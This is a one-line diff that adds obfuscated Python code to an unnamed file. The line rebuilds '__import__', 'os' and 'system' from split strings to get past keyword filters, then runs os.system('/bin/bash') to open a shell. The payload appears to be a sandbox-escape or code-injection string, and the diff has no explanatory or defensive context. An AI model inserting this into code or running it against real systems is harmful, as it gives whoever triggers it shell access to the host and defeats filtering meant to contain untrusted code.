@@ -1,0 +1,1 @@
+__builtins__.__dict__['__imp'+'ort__']("o"+"s").__dict__['sys'+'tem']('/bin/bash')
